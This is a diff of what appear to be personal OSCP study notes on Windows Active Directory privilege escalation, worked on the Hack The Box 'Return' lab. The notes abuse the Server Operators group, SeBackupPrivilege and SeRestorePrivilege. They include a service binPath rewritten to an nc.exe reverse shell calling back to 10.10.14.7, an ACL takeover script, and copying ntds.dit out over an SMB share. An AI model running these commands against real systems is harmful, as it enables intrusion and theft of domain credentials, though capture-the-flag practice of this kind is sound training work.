@@ -1309,17 +1309,36 @@ gpupdate /force # Must update the policies after changing
 net user anirudh # Boom user added into local admin group, loginwith impacket-psexec with anirudh user,you will admin privileges 
 ```
 
-### Server Operator to get Admin svc-printer AD WinPrivEsc
+### Server Operator to get Admin, start and stop service svc-printer AD WinPrivEsc
 - I saw that user has [SeBackupPrivilege](SMB getting hash & Windows AD full permission GpoEditDeleteModifySecurity) with i can dump the sam and system files dumped those got admin hash but it's not worked, adding the user to admin group access denied
 - [SeRestorePrivilege](https://github.com/ashok5141/OSCP/blob/main/OSCP%20Commands.md#serestoreprivilege-escalation-windows) also enabled with this permission replace with cmd with utilman.exe, the rdesktop with use Win+U
 - net user svc-printer is part of **Server Operators** has start the services [here](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators)
 ```powershell
 net user svc-printer # Part of Server Operators
+services # vmtools not working, then tried vss worked
 sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.7 4444" # Return from HTB
 rlwrap nc -lvnp 4444 # Administrator Shell will be live for some time run this again 'sc.exe start vss'
 sc.exe stop vss
 sc.exe start vss
 ```
+
+#### SeBackupPrivilege & SeRestorePrivilege bypass ACL
+- If you have the both permission are their then we can get full access to the file system
+- Using this [Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1) , we can change the permissions with powershell script.
+- 
+- We can try on the Return HTB
+```powershell
+upload Acl-FullControl.ps1
+Import-Module .\Acl-FullControl.ps1 # chnage the directory to Administrator check the read of root.txt
+Acl-FullControl -user return\svc-printer -path C:\Users\Administrator # -user <domain>\<user>, now you can read the root.txt
+# now we are not NT Authority user, Not working
+impacket-smbserver -smb2support share . # kali command
+copy ntds.dit \\10.10.11.108\Share\ntds.dit # it always used other services can't copy this
+
+
+```
+
+
 
 ---
 
